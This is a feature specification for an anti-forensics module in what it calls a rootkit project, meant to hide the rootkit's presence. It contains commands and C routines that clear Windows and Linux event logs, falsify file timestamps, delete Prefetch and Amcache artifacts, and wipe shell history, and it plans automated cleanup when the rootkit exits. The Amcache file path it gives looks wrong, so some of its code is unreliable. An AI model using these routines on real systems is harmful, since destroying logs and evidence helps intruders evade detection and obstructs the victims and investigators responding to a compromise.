# F0225: Anti-Forensics

## Metadata
| Field | Value |
|---|---|
| ID | F0225 |
| Priority | Medium |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0200, F0203, F0204 |

## Summary
Reduce forensic artifacts and hide rootkit presence through event log clearing, timeline manipulation, and artifact cleanup.

## Windows Anti-Forensics

### Event Log Clearing
```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### Timeline Manipulation
```c
void set_file_mace_times(const char *path, FILETIME *ft) {
    HANDLE h = CreateFile(path, FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
    SetFileTime(h, ft, ft, ft); // Creation, Access, Modify
    CloseHandle(h);
}
```

### Artifact Clearing
```c
void clear_prefetch() {
    char path[MAX_PATH];
    sprintf(path, "%s\\Prefetch\\*.pf", getenv("WINDIR"));
    delete_files(path);
}

void clear_amcache() {
    char path[MAX_PATH];
    sprintf(path, "%s\\AppEvents\\Evtx\\Amcache.hve", getenv("LOCALAPPDATA"));
    truncate_file(path);
}
```

## Linux Anti-Forensics

### Log Clearing
```bash
journalctl --vacuum-time=1s
> /var/log/auth.log
> /var/log/syslog
```

### History Clearing
```bash
history -c
> ~/.bash_history
> ~/.zsh_history
```

## Stages

### Stage 1: Windows Anti-Forensics
- [ ] Event log clearing
- [ ] Timeline manipulation (MACE)
- [ ] Prefetch/Amcache cleanup

### Stage 2: Linux Anti-Forensics
- [ ] Log clearing (journalctl, syslog)
- [ ] History clearing
- [ ] Timestamp manipulation

### Stage 3: Integration
- [ ] Automated cleanup on rootkit exit
- [ ] Configurable cleanup targets
- [ ] Preserve rootkit artifacts

## Feature Acceptance Criteria
- [ ] Event logs cleared without errors
- [ ] File timestamps modified correctly
- [ ] Shell history cleared
- [ ] No system instability after cleanup

## Test Plan

### Unit Tests
- [ ] test_clear_event_log
- [ ] test_set_file_timestamps
- [ ] test_clear_shell_history

### System Tests
- [ ] Run on Windows; verify logs cleared
- [ ] Run on Linux; verify history cleared
- [ ] Verify MACE times modified

### Playwright Tests
- [ ] Configure anti-forensics options
- [ ] Trigger cleanup
- [ ] View cleanup status
